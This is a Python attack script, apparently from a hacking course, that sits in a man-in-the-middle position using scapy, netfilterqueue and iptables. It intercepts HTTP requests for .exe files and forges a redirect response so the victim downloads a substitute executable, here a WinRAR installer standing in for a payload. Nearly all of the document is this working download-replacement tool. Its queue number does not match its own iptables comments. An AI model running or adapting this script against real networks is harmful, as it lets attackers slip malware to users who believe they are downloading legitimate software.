#Run this command in terminal for testing in local
#iptables -I INPUT -j NFQUEUE --queue-num 1
#iptables -I OUTPUT -j NFQUEUE --queue-num 1

# Run this command in terminal when running mitm to dns spoof
#iptables -I FORWARD -j NFQUEUE --queue-num 1

#Run iptables --flush to clear iptable rules after the program is done

import scapy.all as scapy
from netfilterqueue import NetfilterQueue

ack_list=[]

def set_load(packet,load):
	packet[scapy.Raw].load=load 
	del packet[scapy.IP].len
	del packet[scapy.IP].chksum
	del packet[scapy.TCP].chksum
	return packet

def process_packet(packet):
	scapy_packet = scapy.IP(packet.getpayload())
	if scapy_packet.haslayer(scapy.Raw):
		if scapy_packet[scapy.TCP].dport==80:
			if ".exe" in scapy_packet[scapy.Raw].load and "192.168.1.5" not in scapy_packet[scapy.Raw].load:
				print("\n exe Request")
				ack_list.append(scapy_packet[scapy.TCP].ack)
		elif scapy_packet[scapy.TCP].sport==80:
			if scapy_packet[scapy.TCP].seq in ack_list:
				ack_list.remove(scapy_packet[scapy.TCP].seq)
				print("Replacing file")
				modified_packet=set_load(scapy_packet,"HTTP/1.1 301 Moved Permanently\nLocation: https://www.rarlab.com/rar/wrar56b1.exe\n\n")
				packet.set_payload(str(modified_packet))
	packet.accept()

queue=NetfilterQueue()
queue.bind(0,process_packet)
queue.run()